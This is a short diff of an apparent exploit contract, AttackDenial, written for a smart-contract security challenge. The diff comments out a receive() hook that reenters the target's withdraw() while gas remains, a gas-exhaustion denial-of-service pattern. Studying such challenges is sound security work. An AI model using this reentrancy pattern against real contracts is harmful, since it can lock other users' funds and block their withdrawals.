@@ -11,10 +11,10 @@ contract AttackDenial {
     }
 
     receive() payable external {
-        console.log(denialContract.contractBalance());
-        if (gasleft() > 5) {
-            denialContract.withdraw();
-        }
+//        console.log(denialContract.contractBalance());
+//        if (gasleft() > 5) {
+//            denialContract.withdraw();
+//        }
     }
 
     function attack() public {
